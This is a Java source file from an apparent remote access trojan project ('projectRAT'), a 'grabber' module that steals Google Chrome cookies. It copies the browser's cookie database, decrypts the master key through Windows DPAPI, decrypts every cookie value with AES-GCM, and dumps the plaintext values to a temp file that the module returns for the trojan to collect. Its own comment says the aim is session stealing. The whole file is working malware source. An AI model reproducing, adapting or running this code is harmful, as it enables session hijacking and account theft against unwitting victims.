package in.momin5.projectRAT.request.grabbers;

import com.sun.jna.platform.win32.Crypt32Util;
import in.momin5.projectRAT.request.Request;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

/**
 * Cookies can be used for session stealing, which means you can temporarily login with someones cookies, its like a discord token
 * but it expires REALLY, REALLY fast
 */
public class ChromeCookies implements Request {

    File cookieDump;
    @Override
    public void init() throws Exception {
        ArrayList<String> list = getChromeCookies();
        cookieDump = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
        FileOutputStream dumpStream = new FileOutputStream(cookieDump);
        for(String s: list){
            dumpStream.write(s.getBytes());
            dumpStream.write("\n".getBytes());
        }
        dumpStream.flush();
        dumpStream.close();
        cookieDump.deleteOnExit();
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[] {
                cookieDump
        };
    }

    private ArrayList<String> getChromeCookies(){
        ArrayList<String> info = new ArrayList<>();
        Connection conn = null;
        Statement statement = null;

        try {
            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Cookies";
            String finalDestination = System.getProperty("java.io.tmpdir") + "DataCookies";
            File finalDestinationFile = new File(finalDestination);
            if(finalDestinationFile.exists())
                finalDestinationFile.delete();
            FileInputStream in = new FileInputStream(loginDataFile);
            FileOutputStream out = new FileOutputStream(finalDestinationFile);
            int n;
            while ((n = in.read()) != -1){
                out.write(n);
            }
            in.close();
            out.close();
            String stmt = "jdbc:sqlite:" + finalDestination;
            conn = DriverManager.getConnection(stmt);

            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery("SELECT * FROM cookies;");
            while (rs.next()){
                String url = rs.getString("host_key");
                if(url == null) url = "URL not found";
                String username = rs.getString("name");
                if(username == null) username = "Type not found";
                byte[] encpass = rs.getBytes("encrypted_value");
                info.add(String.format("URL: %s TYPE: %s Value: %s",url,username, getDecryptedValue(encpass)));
            }
            rs.close();
            statement.close();
            conn.close();

        }catch (Exception e){
            e.printStackTrace();
        }

        return info;
    }


    private String getDecryptedValue(byte[] data) throws Exception {
        String pathLocalState = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State";
        JSONObject jsonObject = (JSONObject) new JSONParser().parse(new FileReader(pathLocalState));
        String encryptedMasterKeyB64 = (String) ((JSONObject) jsonObject.get("os_crypt")).get("encrypted_key");

        byte[] encryptedMKWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyB64);
        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMKWithPrefix, 5, encryptedMKWithPrefix.length);

        byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);

        byte[] nonce = Arrays.copyOfRange(data, 3, 3 + 12);
        byte[] ciphertextTag = Arrays.copyOfRange(data, 3 + 12, data.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
        byte[] password = cipher.doFinal(ciphertextTag);

        return new String(password, StandardCharsets.UTF_8);
    }
}
